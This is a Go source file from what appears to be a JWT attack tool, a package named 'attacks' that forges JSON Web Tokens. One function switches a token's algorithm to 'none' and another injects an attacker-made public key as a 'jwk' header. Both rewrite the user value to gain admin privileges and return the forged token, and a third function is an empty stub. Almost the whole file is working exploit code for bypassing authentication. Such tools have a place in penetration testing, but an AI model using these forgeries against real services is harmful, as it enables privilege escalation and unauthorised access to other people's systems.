package attacks

import (
	"JWTechniques/ctrl"
	"encoding/json"
	"fmt"

	"github.com/golang-jwt/jwt/v5"
)

func ExploitNoneAlgo(token *jwt.Token) string {

	cpyToken := ctrl.CloneToken(token)
	cpyToken, err := ctrl.ChangeValue(cpyToken, "alg", "none", true)

	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of the \"alg\" header : %v \n", err)
		return ""
	}

	//Change the value of the header to create a token with admin privs
	cpyToken, err = ChangeUserValue(cpyToken)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	//It can be signed with any secret as this vulnerability only works if the signature is not verified
	strToken, err := cpyToken.SignedString(jwt.UnsafeAllowNoneSignatureType)
	if err != nil {
		fmt.Printf("An error ocurred while signing the token with a \"none\" alg : %v \n", err)
		return ""
	}

	return strToken

}

func ExploitAlgoConfusion(token *jwt.Token, algorithm string, publicKey string) string {

	//TODO
	return ""
}

func ExploitPublicKeyInjection(token *jwt.Token, algorithm string) string {

	cpyToken := ctrl.CloneToken(token)

	//Generate public/private keys
	publicKey, privateKey, err := ctrl.GenerateKeys(algorithm)
	if err != nil {
		fmt.Printf("%v\n", err)
		return ""
	}

	//Generate JWK using the public key
	jwkValue, err := ctrl.GenerateJWK(publicKey, algorithm)
	if err != nil {
		fmt.Printf("%v\n", err)
		return ""
	}

	//Inject public key in header
	var jwkMap map[string]any
	err = json.Unmarshal(jwkValue, &jwkMap)
	if err != nil {
		fmt.Printf("failed to unmarshal jwkValue: %v", err)
		return ""
	}
	cpyToken.Header["jwk"] = jwkMap

	//Change the value of the header to create a token with admin privs
	cpyToken, err = ChangeUserValue(cpyToken)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	//Sign the token with the private key
	strToken, err := cpyToken.SignedString(privateKey)
	if err != nil {
		fmt.Printf("An error ocurred while signing the token with a \"none\" alg : %v \n", err)
		return ""
	}

	return strToken
}
